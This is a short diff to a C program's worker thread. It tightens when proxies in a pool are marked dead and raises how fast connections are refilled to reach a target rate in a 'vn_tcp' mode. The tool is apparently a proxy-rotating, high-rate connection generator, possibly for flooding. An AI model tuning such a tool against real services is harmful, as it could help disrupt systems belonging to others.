@@ -2233,7 +2421,7 @@ void *worker_thread(void *arg) {
                             if (curr->proxy) {
                                 __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                 curr->proxy->last_fail_time = now;
-                                if (curr->proxy->fail_count >= 50000) {
+                                if (curr->proxy->fail_count >= 15) {
                                     curr->proxy->is_dead = 1;
                                 }
                                 if (curr->proxy->active_conns > 0) {
@@ -2288,7 +2476,7 @@ void *worker_thread(void *arg) {
                             if (curr->proxy) {
                                 __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                 curr->proxy->last_fail_time = now;
-                                if (curr->proxy->fail_count >= 50000) {
+                                if (curr->proxy->fail_count >= 15) {
                                     curr->proxy->is_dead = 1;
                                 }
                                 if (curr->proxy->active_conns > 0) {
@@ -2321,7 +2509,8 @@ void *worker_thread(void *arg) {
         int total = get_total_active_conns();
         if (total < args.rate) {
             int batch = (args.rate - total);
-            if (batch > 32) batch = 32;
+            int max_refill = args.is_vn_tcp ? 512 : 32;
+            if (batch > max_refill) batch = max_refill;
             for (int b = 0; b < batch; b++) {
                 if (get_total_active_conns() >= args.rate) break;
                 spawn_connection(epoll_fd, tid);
